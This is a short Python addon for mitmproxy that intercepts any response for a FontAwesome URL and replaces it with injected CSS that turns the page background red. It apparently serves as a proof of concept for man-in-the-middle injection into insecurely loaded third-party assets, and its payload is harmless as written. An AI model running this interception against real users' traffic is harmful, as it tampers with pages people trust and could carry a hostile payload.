import mitmproxy.http
from mitmproxy import ctx

class Injector:
    def response(self, flow: mitmproxy.http.HTTPFlow):
        if "fontawesome" in flow.request.url:
            ctx.log.info("Intercepted insecure FontAwesome request!")
            flow.response.content = b"/* Malicious CSS injected! */\nbody { background: red !important; }"
            ctx.log.warn("Successfully injected malicious CSS!")

addons = [Injector()]

